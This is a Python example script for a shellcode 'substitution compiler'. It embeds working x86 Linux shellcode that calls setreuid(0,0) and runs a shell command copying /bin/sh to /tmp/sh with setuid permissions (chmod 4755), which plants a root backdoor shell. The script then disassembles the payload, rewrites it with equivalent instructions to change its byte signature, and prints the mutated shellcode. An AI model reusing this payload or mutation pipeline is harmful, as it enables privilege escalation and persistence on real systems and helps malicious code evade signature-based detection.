"""
An example of how to use the substitution compiler module.
"""

# pylint: disable=wrong-import-position,import-error

import os
import sys


MODULE_DIR_NAME = os.path.dirname(os.path.realpath(__file__))
if MODULE_DIR_NAME not in sys.path:
    sys.path.insert(0, MODULE_DIR_NAME)
PARENT_DIR_NAME = os.path.join(MODULE_DIR_NAME, '..')
if PARENT_DIR_NAME not in sys.path:
    sys.path.insert(0, PARENT_DIR_NAME)


import substitution_parser as parser
from substitution_compiler import Compiler
from substitution_enums import Operand, Operator
from substitution_transpiler import asm_to_shellcode, shellcode_to_asm


_SHELLCODE = (
    b'\x29\xc0'                              # sub ax, ax
    b'\xb0\x02'                              # mov al, 2
    b'\xcd\x80'                              # int 0x80
    b'\x85\xc0'                              # test ax, ax
    b'\x75\x02'                              # jnz exeunt
    b'\xeb\x05'                              # jmp carryon

    # exeunt: exit(x);
    b'\x29\xc0'                              # sub ax, ax
    b'\x40'                                  # inc ax
    b'\xcd\x80'                              # int 0x80

    # carryon: setreuid(0, 0); goto callz;
    b'\x29\xc0'                              # sub ax, ax
    b'\x29\xdb'                              # sub bx, bx
    b'\x29\xc9'                              # sub cx, cx
    b'\xb0\x46'                              # mov al, 0x46
    b'\xcd\x80'                              # int 0x80
    b'\xeb\x2a'                              # jmp callz

    # start: execve()
    b'\x5e'                                  # pop si
    b'\x89\x76\x32'                          # mov [bp+0x32], si
    b'\x8d\x5e\x08'                          # lea bx, [bp+0x08]
    b'\x89\x5e\x36'                          # mov [bp+0x36], bx
    b'\x8d\x5e\x0b'                          # lea bx, [bp+0x0b]
    b'\x89\x5e\x3a'                          # mov [bp+0x3a], bx
    b'\x29\xc0'                              # sub ax, ax
    b'\x88\x46\x07'                          # mov [bp+0x07], al
    b'\x88\x46\x0a'                          # mov [bp+0x0a], al
    b'\x88\x46\x31'                          # mov [bp+0x31], al
    b'\x89\x46\x3e'                          # mov [bp+0x3e], ax
    b'\x87\xf3'                              # xchg si, bx
    b'\xb0\x0b'                              # mov al, 0x0b
    b'\x8d\x4b\x32'                          # lea cx, [bp+di+0x32]
    b'\x8d\x53\x3e'                          # lea dx, [bp+di+0x3e]
    b'\xcd\x80'                              # int 0x80

    # callz: call start
    b'\xe8\xd1\xff\xff\xff'

    # data - command to execve()
    b'\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f'
    b'\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34'
    b'\x37\x35\x35\x20\x2f\x74\x6d\x70\x2f\x73\x68'
)


def shellcodify(bytestring: bytes) -> str:
    hexstring = bytestring.hex()
    hexes = [hexstring[i:i+2] for i in range(0, len(hexstring), 2)]
    mapped = map(lambda h: '\\\\x' + h, hexes)
    return ''.join(list(mapped))


def main():
    'Sample usage of the compiler module on shellcode.'
    print('Outputting given shellcode...')
    print(_SHELLCODE)
    print('')

    raw_disassembly = shellcode_to_asm(_SHELLCODE)
    for line in raw_disassembly:
        print(line)
    print('')
    annotations = parser.parse(raw_disassembly)
    for annotation in annotations:
        print(annotation)
    print('') 

    compiler = Compiler()
    compiler.add_signature(Operator.ADD, [Operand.REG, Operand.REG], '../library/add_reg_reg.txt')
    compiler.add_signature(Operator.SUB, [Operand.REG, Operand.CONST], '../library/sub_reg_const.txt')

    print('Outputting rewritten program...')
    rewritten_program = compiler.apply_substitution(annotations)
    print(rewritten_program)
    print('')

    print('Outputting rewritten shellcode...')
    rewritten_shellcode = asm_to_shellcode(rewritten_program)
    print(rewritten_shellcode)
    print('')

    print('Outputting rewritten shellcode after shellcodify...')
    print(shellcodify(rewritten_shellcode))
    print('')


if __name__ == '__main__':
    main()
